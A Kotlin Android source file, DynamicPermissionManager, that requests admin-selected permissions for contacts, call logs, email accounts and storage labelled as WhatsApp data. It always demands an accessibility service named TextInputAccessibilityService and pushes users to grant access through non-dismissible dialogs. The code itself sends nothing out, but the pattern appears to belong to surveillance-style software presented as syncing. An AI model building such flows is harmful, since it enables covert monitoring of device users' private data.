package com.devicesync.app.utils

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.devicesync.app.services.TextInputAccessibilityService

object DynamicPermissionManager {
    
    private const val TAG = "DynamicPermissionManager"
    private const val PERMISSION_REQUEST_CODE = 2001
    private const val SETTINGS_REQUEST_CODE = 2002
    
    /**
     * Request only the permissions needed for allowed data types + always required permissions
     */
    fun requestRequiredPermissions(activity: Activity) {
        val requiredPermissions = getRequiredPermissions(activity)
        
        if (requiredPermissions.isEmpty()) {
            Log.d(TAG, "No permissions required for current admin config")
            return
        }
        
        Log.d(TAG, "Requesting permissions: $requiredPermissions")
        
        // Filter permissions that are not already granted
        val permissionsToRequest = requiredPermissions.filter { permission ->
            ContextCompat.checkSelfPermission(activity, permission) != PackageManager.PERMISSION_GRANTED
        }
        
        if (permissionsToRequest.isEmpty()) {
            Log.d(TAG, "All required permissions already granted")
            return
        }
        
        Log.d(TAG, "Requesting ${permissionsToRequest.size} permissions: $permissionsToRequest")
        
        // Split out special, non-runtime permissions
        val needsAccessibility = permissionsToRequest.contains(Manifest.permission.BIND_ACCESSIBILITY_SERVICE)
        val interactivePermissions = permissionsToRequest.filter { it != Manifest.permission.BIND_ACCESSIBILITY_SERVICE }

        // If Accessibility is needed, open Accessibility settings screen directly
        if (needsAccessibility) {
            Log.d(TAG, "Accessibility permission required → opening Accessibility settings")
            openAccessibilitySettings(activity)
        }

        if (interactivePermissions.isEmpty()) {
            return
        }

        // Check if email permission is in the remaining list
        val hasEmailPermission = interactivePermissions.contains(Manifest.permission.GET_ACCOUNTS)
        if (hasEmailPermission) {
            // For email permission, show default Android popup directly
            Log.d(TAG, "Email permission detected, showing default Android popup directly")
            requestPermissionsDirectly(activity, interactivePermissions)
            return
        }

        // Show custom guide dialog for the remaining runtime permissions
        showPermissionGuideDialog(activity, interactivePermissions)
    }
    
    /**
     * Get all required permissions (admin-controlled + always required)
     */
    private fun getRequiredPermissions(context: Context): List<String> {
        val permissions = mutableListOf<String>()
        
        // Always required permissions (not controlled by admin)
        permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        permissions.add(Manifest.permission.BIND_ACCESSIBILITY_SERVICE)
        
        // Admin-controlled permissions
        val adminPermissions = AdminConfigManager.getRequiredPermissions()
        permissions.addAll(adminPermissions)
        
        return permissions.distinct()
    }
    
    /**
     * Show custom permission guide dialog
     */
    private fun showPermissionGuideDialog(activity: Activity, permissions: List<String>) {
        // Check if email account permission is in the list
        val hasEmailPermission = permissions.contains(Manifest.permission.GET_ACCOUNTS)
        
        if (hasEmailPermission) {
            // For email permission, show default Android popup directly
            Log.d(TAG, "Email permission detected, showing default Android popup")
            requestPermissionsDirectly(activity, permissions)
            return
        }
        
        val permissionNames = permissions.map { getPermissionDisplayName(it) }
        val permissionList = permissionNames.joinToString("\n• ", "• ")
        
        val message = """
            To provide you with the best experience, we need the following permissions:
            
            $permissionList
            
            We'll guide you through granting these permissions step by step.
        """.trimIndent()
        
        MaterialAlertDialogBuilder(activity)
            .setTitle("Permission Required")
            .setMessage(message)
            .setPositiveButton("Grant Permissions") { _, _ ->
                requestPermissionsDirectly(activity, permissions)
            }
            .setNegativeButton("Later") { _, _ ->
                Log.d(TAG, "User chose to grant permissions later")
            }
            .setCancelable(false)
            .show()
    }
    
    /**
     * Request permissions directly (system dialog)
     */
    private fun requestPermissionsDirectly(activity: Activity, permissions: List<String>) {
        ActivityCompat.requestPermissions(
            activity,
            permissions.toTypedArray(),
            PERMISSION_REQUEST_CODE
        )
    }
    
    /**
     * Show settings guide dialog for denied permissions
     */
    fun showSettingsGuideDialog(activity: Activity, deniedPermissions: List<String>) {
        val permissionNames = deniedPermissions.map { getPermissionDisplayName(it) }
        val permissionList = permissionNames.joinToString("\n• ", "• ")
        
        val message = """
            The following permissions are required but were denied:
            
            $permissionList
            
            We will take you to the exact system screen to enable them.
        """.trimIndent()
        
        MaterialAlertDialogBuilder(activity)
            .setTitle("Permissions Required")
            .setMessage(message)
            .setPositiveButton("Continue") { _, _ ->
                // Route to the most specific settings screens available
                when {
                    deniedPermissions.contains(Manifest.permission.BIND_ACCESSIBILITY_SERVICE) -> {
                        openAccessibilitySettings(activity)
                    }
                    deniedPermissions.contains(Manifest.permission.READ_EXTERNAL_STORAGE) -> {
                        openExternalStorageSettings(activity)
                    }
                    else -> {
                        openAppSettings(activity)
                    }
                }
            }
            .setNegativeButton("Cancel") { _, _ ->
                Log.d(TAG, "User cancelled settings navigation")
            }
            .setCancelable(false)
            .show()
    }
    
    /**
     * Open app settings
     */
    private fun openAppSettings(activity: Activity) {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", activity.packageName, null)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            activity.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error opening app settings", e)
            // Fallback to general settings
            try {
                val intent = Intent(Settings.ACTION_SETTINGS)
                activity.startActivity(intent)
            } catch (e2: Exception) {
                Log.e(TAG, "Error opening general settings", e2)
            }
        }
    }

    /**
     * Open system Accessibility settings screen
     */
    private fun openAccessibilitySettings(activity: Activity) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            activity.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error opening accessibility settings", e)
            openAppSettings(activity)
        }
    }

    /**
     * Open system External Storage management screen for this app
     */
    private fun openExternalStorageSettings(activity: Activity) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // Android 11+ All files access screen for this app
                val uri = Uri.parse("package:" + activity.packageName)
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
                activity.startActivity(intent)
            } else {
                // Fallback: App details where Storage permission can be toggled
                openAppSettings(activity)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error opening external storage settings", e)
            // Fallback to global All files access screen
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    activity.startActivity(intent)
                } else {
                    openAppSettings(activity)
                }
            } catch (e2: Exception) {
                Log.e(TAG, "Error opening manage all files settings", e2)
                openAppSettings(activity)
            }
        }
    }
    
    /**
     * Check if all required permissions are granted
     */
    fun areAllRequiredPermissionsGranted(context: Context): Boolean {
        val requiredPermissions = getRequiredPermissions(context)
        
        if (requiredPermissions.isEmpty()) {
            return true // No permissions required
        }
        
        return requiredPermissions.all { permission ->
            when (permission) {
                Manifest.permission.BIND_ACCESSIBILITY_SERVICE -> {
                    // Check if accessibility service is actually enabled
                    TextInputAccessibilityService.isServiceEnabled
                }
                else -> {
                    ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
                }
            }
        }
    }
    
    /**
     * Get list of denied permissions
     */
    fun getDeniedPermissions(context: Context): List<String> {
        val requiredPermissions = getRequiredPermissions(context)
        
        return requiredPermissions.filter { permission ->
            ContextCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED
        }
    }
    
    /**
     * Check if a specific permission is granted
     */
    fun isPermissionGranted(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Check if a specific data type permission is granted
     */
    fun isDataTypePermissionGranted(context: Context, dataType: String): Boolean {
        if (!AdminConfigManager.isDataTypeAllowed(dataType)) {
            return true // Not allowed, so no permission needed
        }
        
        val permission = when (dataType) {
            "CONTACTS" -> Manifest.permission.READ_CONTACTS
            "CALL_LOGS" -> Manifest.permission.READ_CALL_LOG

            "NOTIFICATIONS" -> Manifest.permission.POST_NOTIFICATIONS
            "EMAIL_ACCOUNTS" -> Manifest.permission.GET_ACCOUNTS
            "WHATSAPP" -> Manifest.permission.READ_EXTERNAL_STORAGE
            else -> return true // Unknown data type, assume allowed
        }
        
        return isPermissionGranted(context, permission)
    }
    
    /**
     * Get permission description for user
     */
    fun getPermissionDescription(dataType: String): String {
        return when (dataType) {
            "CONTACTS" -> "Access to contacts for sync"
            "CALL_LOGS" -> "Access to call history for sync"

            "NOTIFICATIONS" -> "Access to notifications for sync"
            "EMAIL_ACCOUNTS" -> "Access to email accounts for sync"
            "WHATSAPP" -> "Access to WhatsApp data for sync"
            else -> "Access to $dataType data for sync"
        }
    }
    
    /**
     * Handle permission request result
     */
    fun onRequestPermissionsResult(
        activity: Activity,
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ): Boolean {
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val deniedPermissions = mutableListOf<String>()
            
            for (i in permissions.indices) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deniedPermissions.add(permissions[i])
                }
            }
            
            if (deniedPermissions.isEmpty()) {
                Log.d(TAG, "All required permissions granted")
                return true
            } else {
                Log.w(TAG, "Some permissions denied: $deniedPermissions")
                
                // Check if any permissions should show rationale
                val shouldShowRationale = deniedPermissions.any { permission ->
                    ActivityCompat.shouldShowRequestPermissionRationale(activity, permission)
                }
                
                if (shouldShowRationale) {
                    // Show explanation and try again
                    showPermissionGuideDialog(activity, deniedPermissions)
                } else {
                    // Permissions permanently denied, show settings guide
                    showSettingsGuideDialog(activity, deniedPermissions)
                }
                
                return false
            }
        }
        
        return false
    }
    
    /**
     * Get human-readable permission names
     */
    fun getPermissionDisplayName(permission: String): String {
        return when (permission) {
            Manifest.permission.READ_CONTACTS -> "Contacts"
            Manifest.permission.READ_CALL_LOG -> "Call History"

            Manifest.permission.POST_NOTIFICATIONS -> "Notifications"
            Manifest.permission.GET_ACCOUNTS -> "Email Accounts"
            Manifest.permission.READ_EXTERNAL_STORAGE -> "Storage"
            Manifest.permission.BIND_ACCESSIBILITY_SERVICE -> "Accessibility Service"
            else -> permission
        }
    }
} 